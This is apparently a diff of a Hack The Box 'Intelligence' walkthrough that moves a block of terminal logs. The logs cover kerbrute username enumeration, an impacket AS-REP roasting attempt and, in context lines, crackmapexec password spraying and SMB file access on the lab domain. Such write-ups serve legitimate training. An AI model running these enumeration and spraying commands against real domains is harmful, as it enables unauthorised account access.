@@ -138,6 +138,98 @@ done
 2020-06-04-upload.pdf:After logging in please change your password as soon as possible.
 ```
 
+```bash
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
+└─# bash gen_date.sh > dates.txt && cat dates.txt | while read line; do echo ${line}$string-upload.pdf; done > file_name.txt 
+```
+
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
+└─# ./kerbrute_linux_amd64 userenum users.txt -d intelligence.htb --dc intelligence.htb 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/27/21 - Ronnie Flathers @ropnop
+
+2021/10/27 00:07:33 >  Using KDC(s):
+2021/10/27 00:07:33 >  	intelligence.htb:88
+
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Daniel.Shelton@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Wilson@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Danny.Matthews@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Brian.Baker@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Mcbride@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Darryl.Harris@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Anita.Roberts@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Brian.Morris@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Reed@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Ian.Duncan@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jose.Williams@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jennifer.Thomas@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 John.Coleman@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jason.Patterson@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jessica.Moody@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Kelly.Long@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Nicole.Brock@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jason.Wright@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Kaitlyn.Zimmerman@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Richard.Williams@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Scott.Scott@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Thomas.Hall@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Stephanie.Young@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Samuel.Richardson@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Veronica.Patel@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 William.Lee@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Travis.Evans@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Tiffany.Molina@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Thomas.Valenzuela@intelligence.htb
+2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Teresa.Williamson@intelligence.htb
+2021/10/27 00:07:33 >  Done! Tested 30 usernames (30 valid) in 0.588 seconds
+```
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
+└─# python3 GetNPUsers.py intelligence.htb/ -usersfile users.txt                                                127 ⨯
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+```
+
 ```
 ┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
 └─# crackmapexec smb intelligence.htb -u users.txt -p 'NewIntelligenceCorpUser9876' --shares 
@@ -252,96 +344,3 @@ smb: \Tiffany.Molina\Desktop\> more user.txt
 getting file \Tiffany.Molina\Desktop\user.txt of size 34 as /tmp/smbmore.nA33pC (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
 smb: \Tiffany.Molina\Desktop\> 
 ```
-
-```bash
-┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
-└─# bash gen_date.sh > dates.txt && cat dates.txt | while read line; do echo ${line}$string-upload.pdf; done > file_name.txt 
-```
-
-
-```
-┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
-└─# ./kerbrute_linux_amd64 userenum users.txt -d intelligence.htb --dc intelligence.htb 
-
-    __             __               __     
-   / /_____  _____/ /_  _______  __/ /____ 
-  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
- / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
-
-Version: v1.0.3 (9dad6e1) - 10/27/21 - Ronnie Flathers @ropnop
-
-2021/10/27 00:07:33 >  Using KDC(s):
-2021/10/27 00:07:33 >  	intelligence.htb:88
-
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Daniel.Shelton@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Wilson@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Danny.Matthews@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Brian.Baker@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Mcbride@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Darryl.Harris@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Anita.Roberts@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Brian.Morris@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 David.Reed@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Ian.Duncan@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jose.Williams@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jennifer.Thomas@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 John.Coleman@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jason.Patterson@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jessica.Moody@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Kelly.Long@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Nicole.Brock@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Jason.Wright@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Kaitlyn.Zimmerman@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Richard.Williams@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Scott.Scott@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Thomas.Hall@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Stephanie.Young@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Samuel.Richardson@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Veronica.Patel@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 William.Lee@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Travis.Evans@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Tiffany.Molina@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Thomas.Valenzuela@intelligence.htb
-2021/10/27 00:07:33 >  [+] VALID USERNAME:	 Teresa.Williamson@intelligence.htb
-2021/10/27 00:07:33 >  Done! Tested 30 usernames (30 valid) in 0.588 seconds
-```
-
-```
-┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
-└─# python3 GetNPUsers.py intelligence.htb/ -usersfile users.txt                                                127 ⨯
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-
-[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
-
-```
-
